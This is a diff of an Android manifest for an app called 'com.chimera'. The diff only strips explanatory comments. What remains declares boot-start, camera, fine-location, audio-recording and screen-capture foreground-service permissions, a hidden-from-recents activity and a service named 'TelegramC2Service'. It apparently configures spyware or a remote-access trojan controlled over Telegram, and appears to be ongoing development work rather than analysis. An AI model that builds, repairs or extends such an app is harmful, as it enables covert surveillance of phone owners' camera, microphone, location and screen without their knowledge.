@@ -3,26 +3,18 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.chimera">
 
-    <!-- Core Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
 
-    <!--
-    FIXED: Added the required permissions that directly correspond to the
-    foregroundServiceType declarations in the <service> tag below.
-    This is mandatory on newer Android versions and resolves the startup crash.
-    -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
 
-    <!-- Feature Permissions -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-
 
     <application
         android:name=".ChimeraApplication"
@@ -50,7 +42,6 @@
             android:taskAffinity=""
             android:excludeFromRecents="true"/>
 
-        <!-- The foregroundServiceType must have corresponding permissions declared above -->
         <service
             android:name=".TelegramC2Service"
             android:enabled="true"
